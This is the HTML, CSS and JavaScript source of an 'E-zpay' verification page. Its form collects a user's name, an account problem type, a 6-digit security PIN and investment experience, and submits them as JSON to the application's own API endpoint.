<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>E-z Pay Verification</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, sans-serif;
      }
      body {
        background: #fff;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
      }
      .header {
        width: 100%;
        max-width: 1500px;
        background: #6e41ec;
        padding: 30px;
        border-radius: 18px;
        text-align: center;
        color: #fff;
        margin-bottom: 35px;
        position: relative;
        line-height: 40px;
      }
      .logout-btn {
        position: absolute;
        right: 20px;
        top: 18px;
        background: #ff5722;
        color: #fff;
        border: none;
        padding: 7px 16px;
        border-radius: 8px;
        cursor: pointer;
        font-size: 14px;
      }
      .form-box {
        width: 95%;
        max-width: 760px;
        background: #fff;
        padding: 35px;
        border-radius: 22px;
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
        border: 1px solid #e6e6e6;
      }
      .form-box h2 {
        text-align: center;
        margin-bottom: 25px;
        font-size: 24px;
        color: #333;
      }
      label {
        display: block;
        margin-top: 18px;
        font-weight: bold;
        font-size: 15px;
      }
      input,
      select {
        width: 100%;
        padding: 13px;
        margin-top: 7px;
        border: 1px solid #ccc;
        border-radius: 10px;
        font-size: 15px;
        background: #fafafa;
      }
      .password-box {
        position: relative;
      }
      #pin {
        text-align: center;
        letter-spacing: 4px;
      }
      .eye-icon {
        position: absolute;
        right: 12px;
        top: 50%;
        transform: translateY(-50%);
        cursor: pointer;
        font-size: 18px;
      }
      button.submit-btn {
        width: 100%;
        margin-top: 28px;
        background: #6e41ec;
        border: none;
        padding: 14px;
        color: #fff;
        font-size: 17px;
        border-radius: 10px;
        cursor: pointer;
      }
      #popupOverlay {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.5);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 999;
      }
      #popupBox {
        width: 90%;
        max-width: 380px;
        background: #fff;
        padding: 25px;
        border-radius: 15px;
        text-align: center;
      }
      #popupBox img {
        width: 70px;
        margin-bottom: 15px;
      }
      #okBtn {
        background: #6e41ec;
        color: #fff;
        border: none;
        padding: 10px 26px;
        cursor: pointer;
        border-radius: 8px;
        font-size: 16px;
      }
      @media (max-width: 480px) {
        body {
          padding: 10px;
        }
        .header {
          padding: 18px;
          margin-bottom: 25px;
        }
        .header h1 {
          font-size: 22px;
        }
        .header p {
          font-size: 14px;
        }
        .logout-btn {
          top: 10px;
          right: 10px;
          font-size: 12px;
          padding: 6px 12px;
        }
        .form-box {
          padding: 20px;
        }
        .form-box h2 {
          font-size: 20px;
        }
      }
    </style>
  </head>
  <body>
    <div class="header">
      <h1>Welcome to E-zpay</h1>
      <p>Please complete your verification</p>
      <button class="logout-btn" onclick="location.href='signin.html'">
        Logout
      </button>
    </div>

    <form class="form-box" id="verificationForm">
      <h2>Verification Details</h2>
      <label>Full Name</label>
      <input
        type="text"
        name="full_name"
        required
        placeholder="Enter your name"
      />

      <label>Problem</label>
      <select name="problem" required>
        <option value="">Select your problem</option>
        <option>Id auto Logout</option>
        <option>Slow sell</option>
        <option>Quto not added</option>
        <option>Tool auto deauthorized</option>
      </select>

      <label>Security PIN (6 digits)</label>
      <div class="password-box">
        <input
          type="password"
          id="pin"
          name="security_pin"
          maxlength="6"
          placeholder="******"
          required
        />
        <span class="eye-icon" id="toggleEye">üëÅÔ∏è</span>
      </div>

      <label>Investment Experience</label>
      <select name="experience" required>
        <option value="">Select experience Level</option>
         <option>Beginner (0-1 years)</option>
        <option>Intermediate (1-3 years)</option>
        <option>Experienced (3-5 years)</option>
        <option>Expert (5+ years)</option>
      </select>

      <button type="submit" class="submit-btn">Submit Verification</button>
    </form>

    <div id="popupOverlay">
      <div id="popupBox">
        <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" />
        <h2>Success</h2>
        <p>Your verification has been submitted successfully</p>
        <button id="okBtn">OK</button>
      </div>
    </div>

    <script type="module">
      import { API_BASE_URL } from "./config.js";

      const form = document.getElementById("verificationForm");
      const pinInput = document.getElementById("pin");
      const toggleEye = document.getElementById("toggleEye");
      const popupOverlay = document.getElementById("popupOverlay");
      const okBtn = document.getElementById("okBtn");

      toggleEye.onclick = () =>
        (pinInput.type = pinInput.type === "password" ? "text" : "password");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        const userId = localStorage.getItem("userId");
        if (!userId) {
          alert("User not logged in");
          return;
        }

        const data = {
          userId,
          full_name: form.full_name.value,
          problem: form.problem.value,
          security_pin: form.security_pin.value,
          experience: form.experience.value,
        };

        try {
          const res = await fetch(`${API_BASE_URL}/api/verify`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
          });
          const result = await res.json();
          if (result.success) {
            popupOverlay.style.display = "flex";
            setTimeout(() => (window.location.href = "signin.html"), 10000);
          } else alert("Verification failed");
        } catch {
          alert("Server not responding");
        }
      });

      okBtn.onclick = () => (window.location.href = "signin.html");
    </script>
  </body>
</html>
